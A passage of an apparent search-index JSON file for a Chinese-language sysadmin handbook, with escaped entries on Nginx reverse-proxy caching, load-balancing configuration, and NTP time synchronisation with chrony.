\u200b\u7684\u200b\uff0c\u200b\u8fd9\u200b\u610f\u5473\u7740\u200b\u8fd9\u4e2a\u200b\u5934\u200b\u4e0d\u200b\u5e94\u8be5\u200b\u6309\u7167\u200b\u539f\u6837\u200b\u8f6c\u53d1\u200b\u3002\u200b\u76f4\u63a5\u200b\u8f6c\u53d1\u200b\u4f1a\u200b\u5b58\u5728\u200b\u975e\u200b\u9884\u671f\u200b\u7684\u200b\u526f\u4f5c\u7528\u200b\u3002</p>"},{"location":"ops/network-service/nginx/#reverse-proxy-caching","title":"\u53cd\u4ee3\u200b\u7f13\u5b58","text":"<p>Nginx \u200b\u53ef\u4ee5\u200b\u4f5c\u4e3a\u200b\u53cd\u5411\u200b\u4ee3\u7406\u200b\u7f13\u5b58\u200b\u670d\u52a1\u5668\u200b\uff0c\u200b\u7f13\u5b58\u200b\u540e\u200b\u7aef\u7684\u200b\u54cd\u5e94\u200b\u5185\u5bb9\u200b\uff0c\u200b\u4ece\u800c\u200b\u51cf\u5c11\u200b\u540e\u200b\u7aef\u7684\u200b\u8d1f\u8f7d\u200b\uff0c\u200b\u63d0\u5347\u200b\u6027\u80fd\u200b\u3002\u200b\u5e38\u7528\u200b\u4e8e\u200b\u7f13\u5b58\u200b\u5c40\u57df\u7f51\u200b\u5916\u90e8\u200b\u7684\u200b\u9759\u6001\u200b\u8d44\u6e90\u200b\uff08\u200b\u5c06\u200b\u5916\u90e8\u200b\u7684\u200b\u7f51\u7ad9\u200b\u4f5c\u4e3a\u200b\u53cd\u5411\u200b\u4ee3\u7406\u200b\u7684\u200b\u300c\u200b\u540e\u200b\u7aef\u200b\u300d\uff09\uff0c\u200b\u63d0\u4f9b\u200b\u7ed9\u200b\u5c40\u57df\u7f51\u200b\u5185\u200b\u7684\u200b\u7528\u6237\u200b\u8bbf\u95ee\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\u9700\u8981\u200b\u5728\u200b <code>http</code> \u200b\u5757\u200b\u4e2d\u200b\u8bbe\u7f6e\u200b\u7f13\u5b58\u200b\u8def\u5f84\u200b\uff0c\u200b\u7c7b\u4f3c\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>http {\n    # ...\n    proxy_cache_path /var/cache/nginx levels=1:2 keys_zone=exampleCache:128m inactive=1d max_size=4G;\n}\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\uff0c<code>proxy_cache_path</code> \u200b\u6307\u4ee4\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u7f13\u5b58\u200b\u5b58\u50a8\u200b\u8def\u5f84\u200b\u7b49\u200b\u53c2\u6570\u200b\u3002\u200b\u8fd9\u91cc\u200b\u7684\u200b\u53c2\u6570\u200b\u542b\u4e49\u200b\u5982\u4e0b\u200b\uff1a</p> <ul> <li><code>levels=1:2</code>\uff1a\u200b\u5b9a\u4e49\u200b\u7f13\u5b58\u200b\u76ee\u5f55\u200b\u7684\u200b\u5c42\u7ea7\u200b\u7ed3\u6784\u200b\uff0c<code>1:2</code> \u200b\u8868\u793a\u200b\u7b2c\u4e00\u5c42\u200b\u76ee\u5f55\u200b\u4f7f\u7528\u200b 1 \u200b\u4e2a\u5b57\u7b26\u200b\uff0c\u200b\u7b2c\u4e8c\u5c42\u200b\u76ee\u5f55\u200b\u4f7f\u7528\u200b 2 \u200b\u4e2a\u5b57\u7b26\u200b\uff0c\u200b\u6700\u7ec8\u200b\u8def\u5f84\u200b\u5c31\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b <code>/var/cache/nginx/a/bc/...bca</code> \u200b\u8fd9\u6837\u200b\u7684\u200b\u5f62\u5f0f\u200b\u3002\u200b\u8fd9\u662f\u200b\u4e3a\u4e86\u200b\u907f\u514d\u200b\u5355\u4e2a\u200b\u76ee\u5f55\u200b\u4e0b\u200b\u6587\u4ef6\u200b\u8fc7\u591a\u200b\u5728\u200b\u4e00\u4e9b\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e2d\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u7684\u200b\u6027\u80fd\u200b\u95ee\u9898\u200b\u3002</li> <li><code>keys_zone=exampleCache:128m</code>\uff1a\u200b\u5b9a\u4e49\u200b\u7f13\u5b58\u200b\u952e\u503c\u200b\u533a\u57df\u200b\u7684\u200b\u540d\u79f0\u200b\u548c\u200b\u5927\u5c0f\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u662f\u200b <code>exampleCache</code>\uff0c\u200b\u5927\u5c0f\u200b\u4e3a\u200b 128MB\u3002\u200b\u6ce8\u610f\u200b 128MB \u200b\u4e0d\u662f\u200b\u7f13\u5b58\u200b\u7684\u200b\u603b\u200b\u5927\u5c0f\u200b\uff0c\u200b\u800c\u200b\u53ea\u662f\u200b\u7528\u4e8e\u200b\u5b58\u50a8\u200b\u7f13\u5b58\u200b\u952e\u503c\u200b\u7684\u200b\u5185\u5b58\u5927\u5c0f\u200b\u30021MB \u200b\u5927\u7ea6\u200b\u53ef\u4ee5\u200b\u5b58\u50a8\u200b 8000 \u200b\u4e2a\u952e\u200b\u3002</li> <li><code>inactive=1d</code>\uff1a\u200b\u5b9a\u4e49\u200b\u7f13\u5b58\u200b\u9879\u200b\u5728\u200b\u591a\u957f\u65f6\u95f4\u200b\u5185\u200b\u6ca1\u6709\u200b\u88ab\u200b\u8bbf\u95ee\u200b\u5c31\u200b\u4f1a\u200b\u88ab\u200b\u5220\u9664\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u662f\u200b 1 \u200b\u5929\u200b\u3002\u200b\u9ed8\u8ba4\u200b\u662f\u200b 10 \u200b\u5206\u949f\u200b\u3002</li> <li><code>max_size=4G</code>\uff1a\u200b\u5b9a\u4e49\u200b\u7f13\u5b58\u200b\u7684\u200b\u6700\u5927\u200b\u5927\u5c0f\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u662f\u200b 4GB\u3002</li> </ul> <p>\u200b\u4e4b\u540e\u200b\u5728\u200b\u9700\u8981\u200b\u7f13\u5b58\u200b\u7684\u200b\u5757\u200b\u4e2d\u200b\u52a0\u5165\u200b <code>proxy_cache</code> \u200b\u6307\u4ee4\u200b\u3002\u200b\u4ee5\u4e0b\u200b\u662f\u200b\u4e00\u4e2a\u200b\u6bd4\u8f83\u200b\u6fc0\u8fdb\u200b\u7684\u200b\u7f13\u5b58\u200b\u914d\u7f6e\u200b\uff1a</p> <pre><code>location / {\n    proxy_pass http://backend_server;\n    proxy_cache exampleCache;  # \u200b\u542f\u7528\u200b exampleCache \u200b\u5bf9\u5e94\u200b\u7684\u200b\u7f13\u5b58\u200b\n    proxy_cache_valid 200 12h;  # \u200b\u5b9a\u4e49\u200b 200 \u200b\u54cd\u5e94\u200b\u7684\u200b\u7f13\u5b58\u200b\u65f6\u95f4\u200b\u4e3a\u200b 12 \u200b\u5c0f\u65f6\u200b\n    proxy_cache_valid 301 302 6h;  # \u200b\u5b9a\u4e49\u200b 301 \u200b\u548c\u200b 302 \u200b\u54cd\u5e94\u200b\u7684\u200b\u7f13\u5b58\u200b\u65f6\u95f4\u200b\u4e3a\u200b 6 \u200b\u5c0f\u65f6\u200b\n    proxy_cache_valid 400 500 502 504 1m;  # \u200b\u5b9a\u4e49\u200b 4xx \u200b\u548c\u200b 5xx \u200b\u54cd\u5e94\u200b\u7684\u200b\u7f13\u5b58\u200b\u65f6\u95f4\u200b\u4e3a\u200b 1 \u200b\u5206\u949f\u200b\n    proxy_cache_valid any 5m;  # \u200b\u5b9a\u4e49\u200b\u5176\u4ed6\u200b\u54cd\u5e94\u200b\u7684\u200b\u7f13\u5b58\u200b\u65f6\u95f4\u200b\u4e3a\u200b 5 \u200b\u5206\u949f\u200b\n    proxy_cache_revalidate on;  # \u200b\u5bf9\u200b\u8fc7\u671f\u200b\u7684\u200b\u7f13\u5b58\u200b\u4f7f\u7528\u200b\u6761\u4ef6\u200b\u8bf7\u6c42\u200b\n    proxy_cache_use_stale error timeout invalid_header updating http_500 http_502 http_503 http_504;  # \u200b\u5728\u200b\u540e\u200b\u7aef\u200b\u9519\u8bef\u200b\u65f6\u200b\u4f7f\u7528\u200b\u8fc7\u671f\u200b\u7f13\u5b58\u200b\n    add_header X-Cache-Status $upstream_cache_status;  # \u200b\u6dfb\u52a0\u200b\u54cd\u5e94\u200b\u5934\u200b\u663e\u793a\u200b\u7f13\u5b58\u200b\u72b6\u6001\u200b\n}\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\u52a0\u5165\u200b\u7684\u200b\u4e00\u4e9b\u200b\u989d\u5916\u200b\u9009\u9879\u200b\uff1a</p> <ul> <li><code>proxy_cache_valid</code> \u200b\u6307\u4ee4\u200b\u7528\u4e8e\u200b\u5b9a\u4e49\u200b\u4e0d\u540c\u200b\u54cd\u5e94\u200b\u72b6\u6001\u200b\u7801\u200b\u7684\u200b\u7f13\u5b58\u200b\u65f6\u95f4\u200b\u3002</li> <li><code>proxy_cache_revalidate</code> \u200b\u5219\u200b\u4f1a\u200b\u5728\u200b\u7f13\u5b58\u200b\u8fc7\u671f\u200b\u540e\u200b\u4f7f\u7528\u200b\u6761\u4ef6\u200b\u8bf7\u6c42\u200b\uff08If-Modified-Since \u200b\u6216\u200b If-None-Match\uff09\u200b\u6765\u200b\u9a8c\u8bc1\u200b\u7f13\u5b58\u200b\u7684\u200b\u6709\u6548\u6027\u200b\uff0c\u200b\u5982\u679c\u200b\u540e\u200b\u7aef\u200b\u8d44\u6e90\u200b\u6ca1\u6709\u200b\u53d8\u5316\u200b\uff0c\u200b\u5219\u200b\u7ee7\u7eed\u200b\u4f7f\u7528\u200b\u7f13\u5b58\u200b\u3002</li> <li><code>proxy_cache_use_stale</code> \u200b\u6307\u4ee4\u200b\u5141\u8bb8\u200b\u5728\u200b\u540e\u200b\u7aef\u200b\u670d\u52a1\u5668\u200b\u51fa\u73b0\u200b\u9519\u8bef\u200b\u65f6\u200b\u4f7f\u7528\u200b\u8fc7\u671f\u200b\u7684\u200b\u7f13\u5b58\u200b\u54cd\u5e94\u200b\uff0c\u200b\u4ece\u800c\u200b\u63d0\u9ad8\u200b\u53ef\u7528\u6027\u200b\u3002</li> <li>\u200b\u6700\u540e\u200b\u7684\u200b <code>add_header</code> \u200b\u7528\u4e8e\u200b\u5728\u200b\u54cd\u5e94\u200b\u5934\u200b\u4e2d\u200b\u6dfb\u52a0\u200b\u4e00\u4e2a\u200b <code>X-Cache-Status</code> \u200b\u5b57\u200b\u6bb5\u200b\uff0c\u200b\u663e\u793a\u200b\u7f13\u5b58\u200b\u72b6\u6001\u200b\uff08<code>HIT</code>\u3001<code>MISS</code>\u3001<code>BYPASS</code> \u200b\u7b49\u200b\uff09\u3002</li> </ul>"},{"location":"ops/network-service/nginx/#load-balancing-configuration","title":"\u8d1f\u8f7d\u200b\u5747\u8861\u200b\u914d\u7f6e","text":"<p>\u200b\u8d1f\u8f7d\u200b\u5747\u8861\u200b\u662f\u200b Nginx \u200b\u7684\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u91cd\u8981\u200b\u529f\u80fd\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u4e8e\u200b\u5206\u53d1\u200b\u8bf7\u6c42\u200b\u5230\u200b\u591a\u4e2a\u200b\u540e\u200b\u7aef\u200b\u670d\u52a1\u5668\u200b\uff0c\u200b\u63d0\u9ad8\u200b\u6027\u80fd\u200b\u548c\u200b\u53ef\u9760\u6027\u200b\u3002</p> <p>\u200b\u4e00\u4e2a\u200b\u5178\u578b\u200b\u7684\u200b\u8d1f\u8f7d\u200b\u5747\u8861\u200b\u914d\u7f6e\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>http {\n    upstream backend {\n        server backend1.example.com;\n        server backend2.example.com;\n        server backend3.example.com;\n    }\n\n    server {\n        listen 80;\n        server_name example.com;\n\n        location / {\n            proxy_pass http://backend;  # \u200b\u5c06\u200b\u8bf7\u6c42\u200b\u8f6c\u53d1\u200b\u5230\u200b upstream \u200b\u5b9a\u4e49\u200b\u7684\u200b\u540e\u200b\u7aef\u200b\u670d\u52a1\u5668\u200b\n            proxy_set_header Host $host;\n            proxy_set_header X-Real-IP $remote_addr;\n            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n        }\n    }\n\n    server {\n        listen 80;\n        server_name another-example.com;\n\n        location / {\n            proxy_pass http://backend;  # \u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u76f8\u540c\u200b\u7684\u200b upstream\n            proxy_set_header Host $host;\n            proxy_set_header X-Real-IP $remote_addr;\n            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n        }\n    }\n}\n</code></pre> <p>Nginx \u200b\u652f\u6301\u200b\u591a\u79cd\u200b\u8d1f\u8f7d\u200b\u5747\u8861\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u5982\u200b\u8f6e\u8be2\u200b\u3001\u200b\u52a0\u6743\u200b\u8f6e\u8be2\u200b\u3001IP \u200b\u54c8\u5e0c\u200b\u3001\u200b\u6700\u5c11\u200b\u8fde\u63a5\u200b\u7b49\u200b\u3002</p> <p>Nginx \u200b\u652f\u6301\u200b\u591a\u79cd\u200b\u8d1f\u8f7d\u200b\u5747\u8861\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u9ed8\u8ba4\u200b\u662f\u200b\u8f6e\u8be2\u200b\uff08round-robin\uff09\u3002\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u5728\u200b upstream \u200b\u5757\u200b\u4e2d\u200b\u6307\u5b9a\u200b\u4e0d\u540c\u200b\u7684\u200b\u7b97\u6cd5\u200b\u6765\u200b\u66f4\u6539\u200b\u8d1f\u8f7d\u200b\u5747\u8861\u200b\u7b56\u7565\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <p>\u200b\u52a0\u6743\u200b\u8f6e\u8be2\u200b\uff1a</p> <pre><code>upstream backend {\n    server backend1.example.com weight=3;  # \u200b\u6743\u91cd\u200b\u4e3a\u200b 3\n    server backend2.example.com weight=1;  # \u200b\u6743\u91cd\u200b\u4e3a\u200b 1\n}\n</code></pre> <p>\u200b\u6700\u5c11\u200b\u8fde\u63a5\u200b\uff1a</p> <pre><code>upstream backend {\n    least_conn;  # \u200b\u4f7f\u7528\u200b\u6700\u5c11\u200b\u8fde\u63a5\u200b\u7b97\u6cd5\u200b\n    server backend1.example.com;\n    server backend2.example.com;\n}\n</code></pre> <p>IP \u200b\u54c8\u5e0c\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u540c\u200b IP \u200b\u7684\u200b\u7528\u6237\u200b\u59cb\u7ec8\u200b\u53ef\u4ee5\u200b\u8bbf\u95ee\u200b\u5230\u200b\u540c\u4e00\u4e2a\u200b\u8282\u70b9\u200b\uff1a</p> <pre><code>upstream backend {\n    ip_hash;  # \u200b\u4f7f\u7528\u200b IP \u200b\u54c8\u5e0c\u200b\u7b97\u6cd5\u200b\n    server backend1.example.com;\n    server backend2.example.com;\n}\n</code></pre> <p>\u200b\u6839\u636e\u200b <code>key</code> \u200b\u6307\u5b9a\u200b\u7684\u200b\u53d8\u91cf\u200b\u8fdb\u884c\u200b\u54c8\u5e0c\u200b\uff1a</p> <pre><code>upstream backend {\n    hash $request_uri consistent;  # \u200b\u4f7f\u7528\u200b\u8bf7\u6c42\u200b URI \u200b\u8fdb\u884c\u200b\u54c8\u5e0c\u200b\n    server backend1.example.com;\n    server backend2.example.com;\n}\n</code></pre> <p>\u200b\u4e00\u81f4\u6027\u200b\u54c8\u5e0c\u200b\u7b97\u6cd5\u200b</p> <p>\u200b\u5728\u200b\u4e0a\u9762\u200b\u7684\u200b\u914d\u7f6e\u200b\u4e2d\u200b\uff0c\u200b\u6211\u4eec\u200b\u6dfb\u52a0\u200b\u4e86\u200b <code>consistent</code> \u200b\u9009\u9879\u200b\uff0c\u200b\u8fd9\u200b\u8868\u793a\u200b\u4f7f\u7528\u200b\u4e00\u81f4\u6027\u200b\u54c8\u5e0c\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u4f20\u7edf\u200b\u7684\u200b <code>hash(key) % N</code> \u200b\u7684\u200b\u65b9\u6cd5\u200b\u3002\u200b\u5b83\u200b\u53ef\u4ee5\u200b\u4fdd\u8bc1\u200b\u5728\u200b\u8282\u70b9\u200b\u6570\u91cf\u200b\u53d8\u5316\u200b\u65f6\u200b\uff0c\u200b\u5c3d\u53ef\u80fd\u5c11\u200b\u5730\u200b\u6539\u53d8\u200b\u5df2\u6709\u200b\u7684\u200b\u6620\u5c04\u200b\u5173\u7cfb\u200b\u3002</p> <p><code>server</code> \u200b\u5757\u200b\u540e\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u6dfb\u52a0\u200b\u8bf8\u5982\u200b <code>max_fails</code>\uff08\u200b\u6700\u5927\u200b\u5931\u8d25\u200b\u6b21\u6570\u200b\uff09\u3001<code>fail_timeout</code>\uff08\u200b\u5931\u8d25\u200b\u8d85\u65f6\u200b\u65f6\u95f4\u200b\uff09\u200b\u7b49\u200b\u53c2\u6570\u200b\u6765\u200b\u63a7\u5236\u200b\u8282\u70b9\u200b\u7684\u200b\u6545\u969c\u200b\u8f6c\u79fb\u200b\u884c\u4e3a\u200b\u3002</p>"},{"location":"ops/network-service/nginx/#rewrite","title":"Rewrite","text":""},{"location":"ops/network-service/nginx/#logging","title":"\u65e5\u5fd7","text":""},{"location":"ops/network-service/nginx/#lua","title":"Lua","text":""},{"location":"ops/network-service/ntp/","title":"\u7f51\u7edc\u200b\u65f6\u95f4\u200b\u540c\u6b65","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@JiaminL\u3001@iBug</p> <p>\u200b\u5728\u200b\u73b0\u4ee3\u200b\u8ba1\u7b97\u73af\u5883\u200b\u4e2d\u200b\uff0c\u200b\u51c6\u786e\u200b\u7684\u200b\u7cfb\u7edf\u200b\u65f6\u95f4\u200b\u5bf9\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u7a33\u5b9a\u200b\u8fd0\u884c\u200b\u81f3\u5173\u91cd\u8981\u200b\u3002\u200b\u65e0\u8bba\u662f\u200b\u5206\u5e03\u5f0f\u200b\u65e5\u5fd7\u200b\u7684\u200b\u5bf9\u9f50\u200b\u3001\u200b\u5b89\u5168\u200b\u8bc1\u4e66\u200b\u7684\u200b\u9a8c\u8bc1\u200b\uff0c\u200b\u8fd8\u662f\u200b\u4efb\u52a1\u8c03\u5ea6\u200b\u4e0e\u200b\u6570\u636e\u200b\u8bb0\u5f55\u200b\uff0c\u200b\u6240\u6709\u200b\u8fd9\u4e9b\u200b\u529f\u80fd\u200b\u7684\u200b\u6b63\u5e38\u200b\u8fd0\u884c\u200b\u90fd\u200b\u4f9d\u8d56\u4e8e\u200b\u7cfb\u7edf\u200b\u65f6\u949f\u200b\u7684\u200b\u51c6\u786e\u6027\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0c\u200b\u6240\u6709\u200b\u8ba1\u7b97\u673a\u200b\u90fd\u200b\u9700\u8981\u200b\u67d0\u79cd\u200b\u201c\u200b\u65f6\u95f4\u200b\u540c\u6b65\u200b\u201d\u200b\u673a\u5236\u200b\uff0c\u200b\u4ee5\u200b\u9632\u6b62\u200b\u7cfb\u7edf\u200b\u65f6\u95f4\u200b\u56e0\u200b\u786c\u4ef6\u200b\u65f6\u949f\u200b\u6f02\u79fb\u200b\u800c\u200b\u9010\u6e10\u200b\u504f\u79bb\u200b\u3002</p>"},{"location":"ops/network-service/ntp/#ntp","title":"NTP \u200b\u534f\u8bae\u200b\u7b80\u4ecb","text":"<p>\u200b\u6807\u51c6\u200b\u7684\u200b\u65f6\u95f4\u200b\u540c\u6b65\u200b\u534f\u8bae\u200b\u662f\u200b NTP\uff08Network Time Protocol\uff09\uff0c\u200b\u5b83\u200b\u5141\u8bb8\u200b\u8ba1\u7b97\u673a\u200b\u901a\u8fc7\u200b\u7f51\u7edc\u200b\u4e0e\u200b\u65f6\u95f4\u200b\u670d\u52a1\u5668\u200b\u901a\u4fe1\u200b\uff0c\u200b\u5b9a\u671f\u200b\u6821\u51c6\u200b\u672c\u5730\u200b\u65f6\u949f\u200b\u3002NTP \u200b\u4f7f\u7528\u200b\u4e00\u79cd\u200b\u5206\u5c42\u200b\u7ed3\u6784\u200b\u7ec4\u7ec7\u200b\u65f6\u95f4\u200b\u6e90\u200b\uff0c\u200b\u6bcf\u5c42\u200b\u79f0\u4e3a\u200b\u4e00\u4e2a\u200b Stratum\u3002Stratum \u200b\u503c\u8d8a\u200b\u5c0f\u200b\uff0c\u200b\u8868\u793a\u200b\u8ddd\u79bb\u200b\u539f\u59cb\u200b\u65f6\u95f4\u200b\u53c2\u8003\u200b\u6e90\u8d8a\u200b\u8fd1\u200b\uff0c\u200b\u7406\u8bba\u200b\u4e0a\u200b\u540c\u6b65\u200b\u7684\u200b\u7cbe\u5ea6\u200b\u4e5f\u200b\u8d8a\u200b\u9ad8\u200b\u3002\u200b\u8fd9\u79cd\u200b\u8bbe\u8ba1\u200b\u8fd8\u200b\u80fd\u200b\u6709\u6548\u200b\u9632\u6b62\u200b\u65f6\u95f4\u200b\u6e90\u200b\u4e4b\u95f4\u200b\u5f62\u6210\u200b\u5faa\u73af\u200b\u4f9d\u8d56\u200b\u3002</p> <ul> <li>Stratum 0\uff1a\u200b\u975e\u200b\u7f51\u7edc\u8bbe\u5907\u200b\uff0c\u200b\u800c\u662f\u200b\u9ad8\u7cbe\u5ea6\u200b\u7684\u200b\u7269\u7406\u200b\u65f6\u95f4\u200b\u6e90\u200b\uff08\u200b\u5982\u200b GPS \u200b\u63a5\u6536\u5668\u200b\u3001\u200b\u539f\u5b50\u200b\u65f6\u949f\u200b\u7b49\u200b\uff09\u3002</li> <li>Stratum 1\uff1a\u200b\u76f4\u63a5\u200b\u8fde\u63a5\u200b\u5230\u200b Stratum 0 \u200b\u7684\u200b\u8ba1\u7b97\u673a\u200b\uff0c\u200b\u4f5c\u4e3a\u200b\u4e00\u7ea7\u200b\u65f6\u95f4\u200b\u6e90\u200b\u3002</li> <li>Stratum 2\uff1a\u200b\u901a\u8fc7\u200b\u7f51\u7edc\u200b\u4ece\u200b\u4e00\u4e2a\u200b\u6216\u200b\u591a\u4e2a\u200b Stratum 1 \u200b\u670d\u52a1\u5668\u200b\u83b7\u53d6\u200b\u65f6\u95f4\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u3002</li> <li>Stratum n\uff1a\u200b\u4ee5\u6b64\u7c7b\u63a8\u200b\uff0c\u200b\u901a\u8fc7\u200b\u7f51\u7edc\u200b\u4ece\u200b Stratum (n-1) \u200b\u83b7\u53d6\u200b\u65f6\u95f4\u200b\uff0c\u200b\u6700\u5927\u200b\u4e3a\u200b Stratum 15\uff1b\u200b\u82e5\u200b\u7cfb\u7edf\u200b\u5904\u4e8e\u200b Stratum 16 \u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u8868\u793a\u200b\u5c1a\u672a\u200b\u6210\u529f\u200b\u540c\u6b65\u200b\u5230\u200b\u4efb\u4f55\u200b\u53ef\u9760\u200b\u7684\u200b\u65f6\u95f4\u200b\u6e90\u200b\u3002</li> </ul> <p>\u200b\u5728\u200b\u5b9e\u9645\u200b\u5e94\u7528\u200b\u4e2d\u200b\uff0c\u200b\u666e\u901a\u200b\u670d\u52a1\u5668\u200b\u6216\u200b\u7ec8\u7aef\u8bbe\u5907\u200b\u4ece\u200b Stratum 2 \u200b\u6216\u200b Stratum 3 \u200b\u7684\u200b\u65f6\u95f4\u200b\u670d\u52a1\u5668\u200b\u540c\u6b65\u200b\u65f6\u95f4\u200b\uff0c\u200b\u5df2\u80fd\u200b\u6ee1\u8db3\u200b\u7edd\u5927\u591a\u6570\u200b\u9700\u6c42\u200b\u3002\u200b\u82e5\u200b\u6761\u4ef6\u200b\u5141\u8bb8\u200b\uff0c\u200b\u9009\u62e9\u7f51\u7edc\u200b\u8def\u5f84\u200b\u66f4\u200b\u77ed\u200b\u3001\u200b\u5ef6\u8fdf\u200b\u66f4\u200b\u4f4e\u200b\u7684\u200b\u65f6\u95f4\u200b\u6e90\u200b\uff0c\u200b\u4f1a\u200b\u83b7\u5f97\u200b\u66f4\u597d\u200b\u7684\u200b\u540c\u6b65\u200b\u6548\u679c\u200b\u3002</p>"},{"location":"ops/network-service/ntp/#ntp-tools","title":"Linux \u200b\u4e2d\u200b\u7684\u200b\u65f6\u95f4\u200b\u540c\u6b65\u200b\u5de5\u5177","text":"<p>Linux \u200b\u4e2d\u200b\u652f\u6301\u200b NTP \u200b\u7684\u200b\u8f6f\u4ef6\u200b\u6709\u200b\u591a\u79cd\u200b\uff0c\u200b\u5176\u4e2d\u200b\u8f83\u4e3a\u200b\u5e38\u89c1\u200b\u7684\u200b\u6709\u200b chrony \u3001 systemd-timesyncd \u200b\u548c\u200b ntpdate\u3002</p>"},{"location":"ops/network-service/ntp/#chrony","title":"chrony","text":"<p>chrony \u200b\u662f\u200b\u4e00\u4e2a\u200b\u529f\u80fd\u4e30\u5bcc\u200b\u7684\u200b NTP \u200b\u8f6f\u4ef6\u200b\uff0c\u200b\u5b83\u200b\u652f\u6301\u200b\u591a\u79cd\u200b\u65f6\u95f4\u200b\u6e90\u200b\u548c\u200b\u7f51\u7edc\u534f\u8bae\u200b\uff0c\u200b\u80fd\u591f\u200b\u5728\u200b\u4e0d\u200b\u7a33\u5b9a\u200b\u7684\u200b\u7f51\u7edc\u200b\u73af\u5883\u200b\u4e2d\u200b\u4fdd\u6301\u200b\u8f83\u200b\u9ad8\u200b\u7684\u200b\u540c\u6b65\u200b\u7cbe\u5ea6\u200b\uff0c\u200b\u751a\u81f3\u200b\u4f7f\u7528\u200b\u4e0e\u200b\u8ba1\u7b97\u673a\u200b\u76f8\u8fde\u200b\u7684\u200b GPS \u200b\u8bbe\u5907\u200b\u4f5c\u4e3a\u200b\u65f6\u949f\u200b\u4fe1\u53f7\u6e90\u200b\u3002chrony \u200b\u8fd8\u200b\u5177\u6709\u200b\u81ea\u52a8\u68c0\u6d4b\u200b\u7f51\u7edc\u200b\u5ef6\u8fdf\u200b\u548c\u200b\u65f6\u949f\u200b\u6f02\u79fb\u200b\u7684\u200b\u80fd\u529b\u200b\uff0c\u200b\u9002\u5408\u200b\u5728\u200b\u865a\u62df\u673a\u200b\u3001\u200b\u7b14\u8bb0\u672c\u7535\u8111\u200b\u7b49\u200b\u7ecf\u5e38\u200b\u53d8\u66f4\u200b\u7f51\u7edc\u200b\u73af\u5883\u200b\u7684\u200b\u8bbe\u5907\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u9700\u8981\u200b\u907f\u514d\u200b\u65f6\u949f\u200b\u8df3\u8dc3\u200b\u7684\u200b\u6570\u636e\u5e93\u200b\u3001\u200b\u65e5\u5fd7\u200b\u7b49\u200b\u670d\u52a1\u5668\u200b\u4e2d\u200b\u4f7f\u7528\u200b\u3002</p> <p>chrony \u200b\u66fe\u7ecf\u200b\u662f\u200b Debian \u200b\u53d1\u884c\u7248\u200b\u7684\u200b\u9ed8\u8ba4\u200b NTP \u200b\u5ba2\u6237\u7aef\u200b\u3002\u200b\u5bf9\u4e8e\u200b Debian \u200b\u548c\u200b Ubuntu \u200b\u53d1\u884c\u7248\u200b\uff0c\u200b\u4f60\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>apt install chrony</code> \u200b\u624b\u52a8\u200b\u5b89\u88c5\u200b\u5b83\u200b\u3002</p> <p>\u200b\u4f7f\u7528\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b\u5f53\u524d\u200b\u540c\u6b65\u200b\u72b6\u6001\u200b\uff0c\u200b\u5305\u62ec\u200b\u7cfb\u7edf\u200b\u65f6\u949f\u200b\u504f\u79fb\u91cf\u200b\u548c\u200b\u8bef\u5dee\u200b\u4fee\u6b63\u200b\u901f\u7387\u200b\u7b49\u200b\u4fe1\u606f\u200b\uff1a</p> <pre><code>chronyc tracking\n</code></pre> <p>\u200b\u67e5\u770b\u200b\u5404\u200b\u65f6\u95f4\u200b\u6e90\u200b\u7684\u200b\u72b6\u6001\u200b\uff08Stratum \u200b\u4e00\u5217\u200b\u5c55\u793a\u200b\u4e86\u200b\u5404\u200b\u65f6\u95f4\u200b\u6e90\u200b\u7684\u200b\u5c42\u7ea7\u200b\uff09\uff1a</p> <pre><code>chronyc sources\nchronyc sources -v  # \u200b\u663e\u793a\u200b\u8be6\u7ec6\u200b\u754c\u9762\u200b\u8bf4\u660e\u200b\n</code></pre> <p>chrony \u200b\u4e5f\u200b\u63d0\u4f9b\u200b\u4e86\u200b NTP \u200b\u670d\u52a1\u7aef\u200b\u7684\u200b\u529f\u80fd\u200b\u3002\u200b\u5728\u200b\u5982\u4eca\u200b\u516c\u7528\u200b NTP \u200b\u670d\u52a1\u5668\u200b\u6c60\u200b\u8d44\u6e90\u200b\u7d27\u5f20\u200b\u3001\u200b\u670d\u52a1\u8d28\u91cf\u200b\u6709\u6240\u200b\u4e0b\u964d\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u5728\u200b\u5c40\u57df\u7f51\u200b\u5185\u200b\u90e8\u7f72\u200b NTP 